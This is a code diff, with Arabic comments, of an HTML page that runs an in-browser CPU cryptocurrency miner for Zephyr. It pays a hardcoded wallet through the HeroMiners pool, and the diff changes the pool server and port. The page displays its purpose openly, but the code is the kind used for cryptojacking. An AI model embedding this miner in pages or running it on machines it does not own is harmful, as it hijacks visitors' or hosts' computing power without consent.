@@ -36,10 +36,8 @@
         <p class="footer">العملة: Zephyr | المحفظة: ZEPHYR2RJ...uEHe4q</p>
     </div>
 
-    <!-- الخطوة 1: تحميل socket.io-client كـ script عادي لتوفير المتغير العام io -->
     <script src="https://cdn.jsdelivr.net/npm/socket.io-client@4.7.5/dist/socket.io.min.js"></script>
 
-    <!-- الخطوة 2: تعريف importmap مع توجيه socket.io-client إلى المتغير العام -->
     <script type="importmap">
     {
         "imports": {
@@ -50,7 +48,6 @@
     </script>
 
     <script type="module">
-        // استيراد المكتبة الرئيسية
         import * as cpuWebMiner from '@marco_ciaramella/cpu-web-miner';
 
         const statusEl = document.getElementById('status');
@@ -62,9 +59,10 @@
         const WALLET = "ZEPHYR2RJGWgAHN6WnZyFZ6GFsURPkJmd8vzeDXmTbwHiKDX9WLtqwSWY8z6UqUiCQiTTe2YURuS7HiefqXPZChmDTM59c4uEHe4q";
         const WORKER_NAME = "Worker_Runner_Node";
 
+        // ✅ تم التحديث: خادم بديل ومنفذ صحيح
         const stratumConfig = {
-            server: "stratum.zephyr.herominers.com",
-            port: 1122,
+            server: "zephyr.herominers.com",  // خادم HeroMiners البديل
+            port: 1123,                       // المنفذ الصحيح لمسبح HeroMiners
             worker: `${WALLET}.${WORKER_NAME}`,
             password: "x",
             ssl: false
